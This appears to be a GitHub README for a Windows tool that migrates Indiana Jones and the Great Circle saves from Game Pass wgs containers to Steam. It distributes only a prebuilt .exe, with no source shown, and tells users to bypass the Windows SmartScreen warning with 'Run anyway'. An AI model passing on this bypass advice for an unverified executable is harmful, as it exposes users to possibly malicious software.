<p align="center">
  <img src="https://i.postimg.cc/L4tt1vXJ/banner.png" alt="Indiana Jones Game Pass to Steam Save Bridge — Convert WGS Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-indy--wgs--bridge--v1.1-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Indiana Jones Game Pass to Steam Save Bridge — Convert WGS Saves to Steam

**Played Indiana Jones and the Great Circle on PC Game Pass and switched to Steam? Xbox App stores MachineGames Motor Engine saves inside hashed SystemAppData\wgs containers. Extract and bridge your adventure progression to Steam Saved Games cleanly.**

Indiana Jones Game Pass to Steam Save Bridge automates transferring saves between Xbox App and Steam on Windows: **decoding `container.index` inside `%LOCALAPPDATA%\Packages\BethesdaSoftworks.*\SystemAppData\wgs\` and reconstructing the slot hierarchy in `%USERPROFILE%\Saved Games\MachineGames\TheGreatCircle\base\savegame`**.

This project is aimed at **Indiana Jones and the Great Circle on Windows 10/11 PC** for migrating single-player saves between PC Game Pass and Steam.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Steam Indiana Jones starts with empty save slots after Game Pass | Xbox App hides saves inside `SystemAppData\wgs` binary containers | Decode `container.index` and extract save slots into Steam `Saved Games` |
| Raw hex blobs copied from `wgs` are ignored by Steam | Motor Engine expects exact `PROFILE` and `GAME-AUTOSAVE` slot structures | Restore internal slot folders and filenames recorded in `container.index` |
| Steam Cloud overwrites migrated saves on launch | Steam Cloud syncs a fresh blank profile on first boot | Run Steam Indiana Jones once first, back up, then copy converted saves |
| Keeping your Game Pass cloud save safe | Editing `wgs` directly can corrupt Xbox cloud sync | Read `wgs` strictly in read-only mode and archive backups first |

## Download for Windows

[**Download IndianaJonesSaveBridge.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/IndianaJonesSaveBridge.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `IndianaJonesSaveBridge.exe`? (Key features)

- Scans `%LOCALAPPDATA%\Packages` to locate the Indiana Jones and the Great Circle `SystemAppData\wgs` folder.
- Decodes `container.index` to rebuild `PROFILE` and `GAME-AUTOSAVE` save directories accurately.
- Creates dated backups of both Xbox `wgs` and Steam `Saved Games\MachineGames\TheGreatCircle` first.
- Leaves your original Xbox Game Pass save completely untouched.

### Sample Output

```text
[IndianaJonesSaveBridge] Scanning BethesdaSoftworks WGS & Steam MachineGames paths...
[OK]   Game Pass WGS    : C:\Users\Player\AppData\Local\Packages\BethesdaSoftworks.ProjectRelic\SystemAppData\wgs
[OK]   Decoded Slots    : PROFILE + GAME-AUTOSAVE0 (Gizeh Chapter | 6.2 MB)
[OK]   Backup Created   : Documents\IndianaJones-SaveBackup\2026-11-23\
[OK]   Steam Target     : C:\Users\Player\Saved Games\MachineGames\TheGreatCircle\base\savegame
```

The release ZIP is named `IndianaJonesSaveBridge.zip`; the Windows executable inside is named `IndianaJonesSaveBridge.exe`.

1. Close Indiana Jones Save Bridge before updating or replacing executable files.
2. Click **Download IndianaJonesSaveBridge.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `IndianaJonesSaveBridge.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Indiana Jones and the Great Circle installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `IndianaJonesSaveBridge.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Containerized `wgs` storage blocking manual copy-paste

Unpacks hashed GUID blobs into standard Motor Engine save directories.

### Preventing Steam Cloud rollbacks

Initializing Steam's `Saved Games\MachineGames` folder before copying ensures Steam Cloud keeps your save.

### Automatic dated backups of both storefronts

Archives existing saves before writing any files.

### 100% read-only access to Xbox `wgs`

Keeps your PC Game Pass progress intact.

## Default folders and configuration paths

Indiana Jones and the Great Circle separates PC Game Pass and Steam saves across two user folders:

```text
%LOCALAPPDATA%\Packages\BethesdaSoftworks.*\SystemAppData\wgs\
```

Typical directory layout:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\BethesdaSoftworks.*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlobs>

Steam Edition (Target):
%USERPROFILE%\Saved Games\MachineGames\TheGreatCircle\base\savegame\<SteamID>\
```

Launch Steam Indiana Jones and the Great Circle once to the main menu so it generates your `<SteamID>` save folder before transferring.

## Quick start guide

Follow these steps to get started:

1. **Close Indiana Jones and the Great Circle on both Xbox App and Steam.** Wait for cloud synchronization to complete.
2. **Launch Steam Indiana Jones once to the main menu, then exit.** Creates `%USERPROFILE%\Saved Games\MachineGames\TheGreatCircle`.
3. **Extract `IndianaJonesSaveBridge.zip` and run `IndianaJonesSaveBridge.exe`.** Backs up both folders and reconstructs your save slots in Steam.
4. **Launch Steam Indiana Jones, load your save, and reach a checkpoint.** Syncs your adventure progress to Steam Cloud.

### Data safety note

Never alter or rename files inside `SystemAppData\wgs\`; work strictly from extracted copies.

## What the status summary shows

Indiana Jones Save Bridge displays **detected `wgs` package path, decoded slots, backup path, and target Steam `Saved Games` folder**.

## FAQ

**Can I transfer my Indiana Jones and the Great Circle save from PC Game Pass to Steam?**

Yes—reconstructing the `PROFILE` and `GAME-AUTOSAVE` folders from `SystemAppData\wgs` into `Saved Games\MachineGames\TheGreatCircle` works cleanly.

**Does this delete my Xbox Game Pass save?**

No. Your `wgs` folder is read-only and remains untouched.

**Will my field notes, relics, and whip upgrades carry over?**

Yes—all progression stored inside your save slots transfers completely.

## Useful reading

- [Indiana Jones and the Great Circle on Steam](https://store.steampowered.com/app/2677660/Indiana_Jones_and_the_Great_Circle/)

## More Windows Gaming Utilities

- [OblivionRemaster-WGSSaveConverter](../OblivionRemaster-WGSSaveConverter) — Oblivion Remastered Game Pass (`wgs`) ↔ Steam save converter
- [DoomDarkAges-GamePassSteamSync](../DoomDarkAges-GamePassSteamSync) — DOOM: The Dark Ages Game Pass ↔ Steam save bridge
- [Expedition33-GamePassSaveBridge](../Expedition33-GamePassSaveBridge) — Clair Obscur: Expedition 33 Game Pass ↔ Steam save bridge
- [ForzaHorizon5-WGSSaveMigrator](../ForzaHorizon5-WGSSaveMigrator) — Forza Horizon 5 PC Game Pass (`wgs`) ↔ Steam save migrator

*Independent community project. Not affiliated with MachineGames, Bethesda Softworks, Lucasfilm Games, Microsoft, Valve, or Steam.*
